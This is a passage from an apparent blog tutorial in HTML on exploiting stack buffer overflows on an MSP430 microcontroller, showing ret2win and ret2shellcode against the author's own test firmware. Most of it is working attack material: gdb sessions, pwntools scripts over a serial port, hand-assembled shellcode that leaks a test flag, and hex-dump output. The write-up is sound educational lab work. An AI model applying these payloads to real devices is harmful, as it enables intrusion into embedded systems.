+<span class="mh">0x43fc</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x2d000a0d</span>	<span class="mh">0x2d2d2d2d</span>	<span class="mh">0x0d2d2d2d</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">stepi</span>
+<span class="mh">0x000045ca</span> <span class="n">in</span> <span class="n">input_loop</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">stepi</span>
+<span class="mh">0x00004140</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>we can just do the same concept that we typically see in ret2win, which is writing the address of the win function to the stack. we can do this with pwntools, which has a built-in way to interface w/ serial devices:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">port</span> <span class="o">=</span> <span class="s">'/dev/ttyACM1'</span>
+<span class="n">baud</span> <span class="o">=</span> <span class="mi">9600</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">serialtube</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">baudrate</span><span class="o">=</span><span class="n">baud</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x45e0</span><span class="p">))</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>the exploit is quite rudimentary, we just fill the buffer with A’s, and then append our return address. really this is no different from standard x86 ret2win, and we can see that it basically works identically!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Sent</span> <span class="mh">0x13</span> <span class="n">bytes</span><span class="o">:</span>
+    <span class="mo">00000000</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span>
+    <span class="mo">00000010</span>  <span class="n">e0</span> <span class="mi">45</span> <span class="mi">0</span><span class="n">a</span>                                            <span class="err">│·</span><span class="n">E</span><span class="err">·│</span>
+    <span class="mo">00000013</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Received</span> <span class="mh">0x39</span> <span class="n">bytes</span><span class="o">:</span>
+    <span class="mo">00000000</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span>
+    <span class="mo">00000010</span>  <span class="n">e0</span> <span class="mi">45</span> <span class="mi">0</span><span class="n">d</span> <span class="mi">0</span><span class="n">d</span>  <span class="mi">0</span><span class="n">a</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">70</span>  <span class="mi">75</span> <span class="mi">74</span> <span class="mi">20</span> <span class="mi">65</span>  <span class="mi">6</span><span class="n">e</span> <span class="mi">74</span> <span class="mi">65</span> <span class="mi">72</span>  <span class="err">│·</span><span class="n">E</span><span class="err">··│·</span><span class="n">inp</span><span class="err">│</span><span class="n">ut</span> <span class="n">e</span><span class="err">│</span><span class="n">nter</span><span class="err">│</span>
+    <span class="mo">00000020</span>  <span class="mi">65</span> <span class="mi">64</span> <span class="mi">20</span> <span class="mi">3</span><span class="n">e</span>  <span class="mi">20</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="err">│</span><span class="n">ed</span> <span class="o">&gt;</span><span class="err">│</span> <span class="n">AAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">AAAA</span><span class="err">│</span>
+    <span class="mo">00000030</span>  <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>  <span class="mi">41</span> <span class="n">e0</span> <span class="mi">45</span> <span class="mi">0</span><span class="n">d</span>  <span class="mi">0</span><span class="n">a</span>                        <span class="err">│</span><span class="n">AAAA</span><span class="err">│</span><span class="n">A</span><span class="err">·</span><span class="n">E</span><span class="err">·│·│</span>
+    <span class="mo">0000003</span><span class="mi">9</span>
+<span class="n">b</span><span class="err">'</span><span class="n">AAAAAAAAAAAAAAAA</span><span class="err">\</span><span class="n">xe0E</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">'</span>
+<span class="n">b</span><span class="err">'</span><span class="n">input</span> <span class="n">entered</span> <span class="o">&gt;</span> <span class="n">AAAAAAAAAAAAAAAA</span><span class="err">\</span><span class="n">xe0E</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">'</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Received</span> <span class="mh">0x23</span> <span class="n">bytes</span><span class="o">:</span>
+    <span class="mo">00000000</span>  <span class="mi">79</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">75</span> <span class="mi">27</span>  <span class="mi">72</span> <span class="mi">65</span> <span class="mi">20</span> <span class="mi">77</span>  <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">65</span>  <span class="mi">72</span> <span class="n">f8</span> <span class="mi">8</span><span class="n">c</span> <span class="mi">0</span><span class="n">e</span>  <span class="err">│</span><span class="n">you</span><span class="err">'│</span><span class="n">re</span> <span class="n">w</span><span class="err">│</span><span class="n">inne</span><span class="err">│</span><span class="n">r</span><span class="err">···│</span>
+    <span class="mo">00000010</span>  <span class="n">e6</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">0</span><span class="n">d</span>  <span class="mi">0</span><span class="n">a</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">74</span>  <span class="mi">65</span> <span class="mi">72</span> <span class="mi">20</span> <span class="mi">69</span>  <span class="mi">6</span><span class="n">e</span> <span class="mi">70</span> <span class="mi">75</span> <span class="mi">74</span>  <span class="err">│·</span><span class="o">--</span><span class="err">·│·</span><span class="n">ent</span><span class="err">│</span><span class="n">er</span> <span class="n">i</span><span class="err">│</span><span class="n">nput</span><span class="err">│</span>
+    <span class="mo">00000020</span>  <span class="mi">20</span> <span class="mi">3</span><span class="n">e</span> <span class="mi">20</span>                                            <span class="err">│</span> <span class="o">&gt;</span> <span class="err">│</span>
+    <span class="mo">00000023</span>
+<span class="n">b</span><span class="s">"you're winner</span><span class="se">\xf8\x8c\x0e\xe6</span><span class="s">--</span><span class="se">\r\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<h3 id="ret2shellcode">ret2shellcode</h3>
+
+<p>finally, we can do ret2shellcode. the thing about the msp430 (and other microcontrollers) is that they don’t support NX regions, so everything is also executable.</p>
+
+<p>we can write some shellcode to the stack, and then just jump to the stack to execute. let’s illustrate w/ an example, by trying to leak a variable defined in the program:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__attribute__</span><span class="p">((</span><span class="n">used</span><span class="p">,</span> <span class="n">retain</span><span class="p">,</span> <span class="n">section</span><span class="p">(</span><span class="s">".rodata"</span><span class="p">)))</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"msp430{ret2shellcode_test}"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>(these ugly attributes are required so that the compiler doesn’t just get rid of our variable).</p>
+
+<p>the way we can leak this variable is by calling <code class="language-plaintext highlighter-rouge">uart_write</code> on it, let’s look at the disassembly for that function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="n">text</span><span class="o">:</span>
+
+<span class="mo">00004446</span> <span class="o">&lt;</span><span class="n">uart_write</span><span class="o">&gt;:</span>
+    <span class="mi">4446</span><span class="o">:</span>	<span class="mi">6</span><span class="n">d</span> <span class="mi">4</span><span class="n">c</span>       	<span class="n">mov</span><span class="p">.</span><span class="n">b</span>	<span class="err">@</span><span class="n">r12</span><span class="p">,</span>	<span class="n">r13</span>	<span class="p">;</span>
+    <span class="mi">4448</span><span class="o">:</span>	<span class="n">cc</span> <span class="mi">93</span> <span class="mo">00</span> <span class="mo">00</span> 	<span class="n">cmp</span><span class="p">.</span><span class="n">b</span>	<span class="err">#</span><span class="mi">0</span><span class="p">,</span>	<span class="mi">0</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span>	<span class="p">;</span><span class="n">r3</span> <span class="n">As</span><span class="o">==</span><span class="mo">00</span>
+    <span class="mi">444</span><span class="n">c</span><span class="o">:</span>	<span class="mi">09</span> <span class="mi">24</span>       	<span class="n">jz</span>	<span class="err">$</span><span class="o">+</span><span class="mi">20</span>     	<span class="p">;</span><span class="n">abs</span> <span class="mh">0x4460</span>
+    <span class="mi">444</span><span class="n">e</span><span class="o">:</span>	<span class="mi">1</span><span class="n">c</span> <span class="mi">53</span>       	<span class="n">inc</span>	<span class="n">r12</span>		<span class="p">;</span>
+    <span class="mi">4450</span><span class="o">:</span>	<span class="n">e2</span> <span class="n">b3</span> <span class="mi">1</span><span class="n">d</span> <span class="mo">06</span> 	<span class="n">bit</span><span class="p">.</span><span class="n">b</span>	<span class="err">#</span><span class="mi">2</span><span class="p">,</span>	<span class="o">&amp;</span><span class="mh">0x061d</span>	<span class="p">;</span><span class="n">r3</span> <span class="n">As</span><span class="o">==</span><span class="mi">10</span>
+    <span class="mi">4454</span><span class="o">:</span>	<span class="n">fd</span> <span class="mi">27</span>       	<span class="n">jz</span>	<span class="err">$</span><span class="o">-</span><span class="mi">4</span>      	<span class="p">;</span><span class="n">abs</span> <span class="mh">0x4450</span>
+    <span class="mi">4456</span><span class="o">:</span>	<span class="n">c2</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">0</span><span class="n">e</span> <span class="mo">06</span> 	<span class="n">mov</span><span class="p">.</span><span class="n">b</span>	<span class="n">r13</span><span class="p">,</span>	<span class="o">&amp;</span><span class="mh">0x060e</span>	<span class="p">;</span>
+    <span class="mi">445</span><span class="n">a</span><span class="o">:</span>	<span class="mi">7</span><span class="n">d</span> <span class="mi">4</span><span class="n">c</span>       	<span class="n">mov</span><span class="p">.</span><span class="n">b</span>	<span class="err">@</span><span class="n">r12</span><span class="o">+</span><span class="p">,</span>	<span class="n">r13</span>	<span class="p">;</span>
+    <span class="mi">445</span><span class="n">c</span><span class="o">:</span>	<span class="mi">0</span><span class="n">d</span> <span class="mi">93</span>       	<span class="n">cmp</span>	<span class="err">#</span><span class="mi">0</span><span class="p">,</span>	<span class="n">r13</span>	<span class="p">;</span><span class="n">r3</span> <span class="n">As</span><span class="o">==</span><span class="mo">00</span>
+    <span class="mi">445</span><span class="n">e</span><span class="o">:</span>	<span class="n">f8</span> <span class="mi">23</span>       	<span class="n">jnz</span>	<span class="err">$</span><span class="o">-</span><span class="mi">14</span>     	<span class="p">;</span><span class="n">abs</span> <span class="mh">0x4450</span>
+    <span class="mi">4460</span><span class="o">:</span>	<span class="mi">30</span> <span class="mi">41</span>       	<span class="n">ret</span>
+</code></pre></div></div>
+
+<p>we can see here that the pointer for our string is in <code class="language-plaintext highlighter-rouge">r12</code>. hence, our shellcode will need to <code class="language-plaintext highlighter-rouge">mov</code> the address of our <code class="language-plaintext highlighter-rouge">flag</code> buffer into <code class="language-plaintext highlighter-rouge">r12</code> first, then call <code class="language-plaintext highlighter-rouge">uart_write</code>.</p>
+
+<p>let’s get those addresses:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x0000fffe</span>  <span class="n">__msp430_resetvec_hook</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x442d</span>
+<span class="mh">0x442d</span> <span class="o">&lt;</span><span class="n">flag</span><span class="o">&gt;:</span>	<span class="s">"msp430{ret2shellcode_test}"</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="n">uart_print</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="n">uart_write</span>
+   <span class="mh">0x4452</span> <span class="o">&lt;</span><span class="n">uart_write</span><span class="o">&gt;:</span>	<span class="n">mov</span><span class="p">.</span><span class="n">b</span>	<span class="err">@</span><span class="n">r12</span><span class="p">,</span>	<span class="n">r13</span>	<span class="p">;</span>
+</code></pre></div></div>
+
+<p>and then let’s compile that shellcode. given that the buffer is 16 bytes in size, i also put in some nops at the beginning:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">section</span> <span class="p">.</span><span class="n">reset</span><span class="p">,</span> <span class="s">"a"</span>       <span class="cm">/* The .reset needs to be alloc, otherwise the flashing tool does not know that this needs to be flashed */</span>
+    <span class="p">.</span><span class="n">word</span> <span class="n">start</span>            <span class="cm">/* Address of entry point */</span>
+
+<span class="p">.</span><span class="n">text</span>
+<span class="n">start</span><span class="o">:</span>
+    <span class="n">nop</span>
+    <span class="n">nop</span>
+    <span class="n">nop</span>
+    <span class="n">nop</span>
+    <span class="n">mov</span> <span class="err">#</span><span class="mh">0x442d</span><span class="p">,</span> <span class="n">r12</span>
+    <span class="n">call</span> <span class="err">#</span><span class="mh">0x4452</span>
+</code></pre></div></div>
+
+<p>this gives us the raw bytes of shellcode we need to write to our buffer.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="n">text</span><span class="o">:</span>
+
+<span class="mo">0000</span><span class="n">c000</span> <span class="o">&lt;</span><span class="n">start</span><span class="o">&gt;:</span>
+    <span class="n">c000</span><span class="o">:</span>	<span class="mo">03</span> <span class="mi">43</span>       	<span class="n">nop</span>			
+    <span class="n">c002</span><span class="o">:</span>	<span class="mo">03</span> <span class="mi">43</span>       	<span class="n">nop</span>			
+    <span class="n">c004</span><span class="o">:</span>	<span class="mo">03</span> <span class="mi">43</span>       	<span class="n">nop</span>			
+    <span class="n">c006</span><span class="o">:</span>	<span class="mo">03</span> <span class="mi">43</span>       	<span class="n">nop</span>			
+    <span class="n">c008</span><span class="o">:</span>	<span class="mi">3</span><span class="n">c</span> <span class="mi">40</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">44</span> 	<span class="n">mov</span>	<span class="err">#</span><span class="mi">17453</span><span class="p">,</span>	<span class="n">r12</span>	<span class="p">;</span><span class="err">#</span><span class="mh">0x442d</span>
+    <span class="n">c00c</span><span class="o">:</span>	<span class="n">b0</span> <span class="mi">12</span> <span class="mi">52</span> <span class="mi">44</span> 	<span class="n">call</span>	<span class="err">#</span><span class="mi">17490</span>		<span class="p">;</span><span class="err">#</span><span class="mh">0x4452</span>
+</code></pre></div></div>
+
+<p>last things last, we need to see the actual address of the stack during execution so we know where to jump to.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">pc</span>             <span class="mh">0x45d2</span>              <span class="mh">0x45d2</span> <span class="o">&lt;</span><span class="n">input_loop</span><span class="o">+</span><span class="mi">170</span><span class="o">&gt;</span>
+<span class="n">sp</span>             <span class="mh">0x43ec</span>              <span class="mi">17388</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> 
+</code></pre></div></div>
+
+<p>now we know our stack is at 0x43ec, our flag is at 0x442d, and our uart_write is at 0x4452.</p>
+
+<p>putting it all together:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">port</span> <span class="o">=</span> <span class="s">'/dev/ttyACM1'</span>
+<span class="n">baud</span> <span class="o">=</span> <span class="mi">9600</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">serialtube</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">baudrate</span><span class="o">=</span><span class="n">baud</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x03\x43</span><span class="s">'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x3c\x40\x2d\x44</span><span class="s">'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xb0\x12\x52\x44</span><span class="s">'</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x43ec</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>we get our flag!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="n">env</span><span class="o">/</span><span class="n">experimentation</span><span class="o">/</span><span class="n">solve</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">python</span> <span class="n">ret2shellcode</span><span class="p">.</span><span class="n">py</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Sent</span> <span class="mh">0x13</span> <span class="n">bytes</span><span class="o">:</span>
+    <span class="mo">00000000</span>  <span class="mo">03</span> <span class="mi">43</span> <span class="mo">03</span> <span class="mi">43</span>  <span class="mo">03</span> <span class="mi">43</span> <span class="mo">03</span> <span class="mi">43</span>  <span class="mi">3</span><span class="n">c</span> <span class="mi">40</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">44</span>  <span class="n">b0</span> <span class="mi">12</span> <span class="mi">52</span> <span class="mi">44</span>  <span class="err">│·</span><span class="n">C</span><span class="err">·</span><span class="n">C</span><span class="err">│·</span><span class="n">C</span><span class="err">·</span><span class="n">C</span><span class="err">│</span><span class="o">&lt;</span><span class="err">@</span><span class="o">-</span><span class="n">D</span><span class="err">│··</span><span class="n">RD</span><span class="err">│</span>
+    <span class="mo">00000010</span>  <span class="n">ec</span> <span class="mi">43</span> <span class="mi">0</span><span class="n">a</span>                                            <span class="err">│·</span><span class="n">C</span><span class="err">·│</span>
+    <span class="mo">00000013</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Received</span> <span class="mh">0x40</span> <span class="n">bytes</span><span class="o">:</span>
+    <span class="mo">00000000</span>  <span class="mo">03</span> <span class="mi">43</span> <span class="mo">03</span> <span class="mi">43</span>  <span class="mo">03</span> <span class="mi">43</span> <span class="mo">03</span> <span class="mi">43</span>  <span class="mi">3</span><span class="n">c</span> <span class="mi">40</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">44</span>  <span class="n">b0</span> <span class="mi">12</span> <span class="mi">52</span> <span class="mi">44</span>  <span class="err">│·</span><span class="n">C</span><span class="err">·</span><span class="n">C</span><span class="err">│·</span><span class="n">C</span><span class="err">·</span><span class="n">C</span><span class="err">│</span><span class="o">&lt;</span><span class="err">@</span><span class="o">-</span><span class="n">D</span><span class="err">│··</span><span class="n">RD</span><span class="err">│</span>
+    <span class="mo">00000010</span>  <span class="n">ec</span> <span class="mi">43</span> <span class="mi">0</span><span class="n">d</span> <span class="mi">0</span><span class="n">d</span>  <span class="mi">0</span><span class="n">a</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">70</span>  <span class="mi">75</span> <span class="mi">74</span> <span class="mi">20</span> <span class="mi">65</span>  <span class="mi">6</span><span class="n">e</span> <span class="mi">74</span> <span class="mi">65</span> <span class="mi">72</span>  <span class="err">│·</span><span class="n">C</span><span class="err">··│·</span><span class="n">inp</span><span class="err">│</span><span class="n">ut</span> <span class="n">e</span><span class="err">│</span><span class="n">nter</span><span class="err">│</span>
+    <span class="mo">00000020</span>  <span class="mi">65</span> <span class="mi">64</span> <span class="mi">20</span> <span class="mi">3</span><span class="n">e</span>  <span class="mi">20</span> <span class="mo">03</span> <span class="mi">43</span> <span class="mo">03</span>  <span class="mi">43</span> <span class="mo">03</span> <span class="mi">43</span> <span class="mo">03</span>  <span class="mi">43</span> <span class="mi">3</span><span class="n">c</span> <span class="mi">40</span> <span class="mi">2</span><span class="n">d</span>  <span class="err">│</span><span class="n">ed</span> <span class="o">&gt;</span><span class="err">│</span> <span class="err">·</span><span class="n">C</span><span class="err">·│</span><span class="n">C</span><span class="err">·</span><span class="n">C</span><span class="err">·│</span><span class="n">C</span><span class="o">&lt;</span><span class="err">@</span><span class="o">-</span><span class="err">│</span>
+    <span class="mo">00000030</span>  <span class="mi">44</span> <span class="n">b0</span> <span class="mi">12</span> <span class="mi">52</span>  <span class="mi">44</span> <span class="n">ec</span> <span class="mi">43</span> <span class="mi">0</span><span class="n">d</span>  <span class="mi">0</span><span class="n">a</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">73</span> <span class="mi">70</span>  <span class="mi">34</span> <span class="mi">33</span> <span class="mi">30</span> <span class="mi">7</span><span class="n">b</span>  <span class="err">│</span><span class="n">D</span><span class="err">··</span><span class="n">R</span><span class="err">│</span><span class="n">D</span><span class="err">·</span><span class="n">C</span><span class="err">·│·</span><span class="n">msp</span><span class="err">│</span><span class="mi">430</span><span class="p">{</span><span class="err">│</span>
+    <span class="mo">00000040</span>
+<span class="n">b</span><span class="err">'\</span><span class="n">x03C</span><span class="err">\</span><span class="n">x03C</span><span class="err">\</span><span class="n">x03C</span><span class="err">\</span><span class="n">x03C</span><span class="o">&lt;</span><span class="err">@</span><span class="o">-</span><span class="n">D</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x12RD</span><span class="err">\</span><span class="n">xecC</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">'</span>
+<span class="n">b</span><span class="err">'</span><span class="n">input</span> <span class="n">entered</span> <span class="o">&gt;</span> <span class="err">\</span><span class="n">x03C</span><span class="err">\</span><span class="n">x03C</span><span class="err">\</span><span class="n">x03C</span><span class="err">\</span><span class="n">x03C</span><span class="o">&lt;</span><span class="err">@</span><span class="o">-</span><span class="n">D</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x12RD</span><span class="err">\</span><span class="n">xecC</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">'</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Received</span> <span class="mh">0x28</span> <span class="n">bytes</span><span class="o">:</span>
+    <span class="mo">00000000</span>  <span class="mi">72</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">32</span>  <span class="mi">73</span> <span class="mi">68</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">c</span>  <span class="mi">6</span><span class="n">c</span> <span class="mi">63</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">64</span>  <span class="mi">65</span> <span class="mi">5</span><span class="n">f</span> <span class="mi">74</span> <span class="mi">65</span>  <span class="err">│</span><span class="n">ret2</span><span class="err">│</span><span class="n">shel</span><span class="err">│</span><span class="n">lcod</span><span class="err">│</span><span class="n">e_te</span><span class="err">│</span>
+    <span class="mo">00000010</span>  <span class="mi">73</span> <span class="mi">74</span> <span class="n">f8</span> <span class="mi">8</span><span class="n">c</span>  <span class="mi">0</span><span class="n">e</span> <span class="n">e6</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">2</span><span class="n">d</span>  <span class="mi">0</span><span class="n">d</span> <span class="mi">0</span><span class="n">a</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">e</span>  <span class="mi">74</span> <span class="mi">65</span> <span class="mi">72</span> <span class="mi">20</span>  <span class="err">│</span><span class="n">st</span><span class="err">··│··</span><span class="o">--</span><span class="err">│··</span><span class="n">en</span><span class="err">│</span><span class="n">ter</span> <span class="err">│</span>
+    <span class="mo">00000020</span>  <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">70</span> <span class="mi">75</span>  <span class="mi">74</span> <span class="mi">20</span> <span class="mi">3</span><span class="n">e</span> <span class="mi">20</span>                            <span class="err">│</span><span class="n">inpu</span><span class="err">│</span><span class="n">t</span> <span class="o">&gt;</span> <span class="err">│</span>
+    <span class="mo">0000002</span><span class="mi">8</span>
+<span class="n">b</span><span class="err">'</span><span class="n">msp430</span><span class="p">{</span><span class="n">ret2shellcode_test</span><span class="err">\</span><span class="n">xf8</span><span class="err">\</span><span class="n">x8c</span><span class="err">\</span><span class="n">x0e</span><span class="err">\</span><span class="n">xe6</span><span class="o">--</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">'</span>
+</code></pre></div></div>
+
+<p>yippee!!!</p>
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
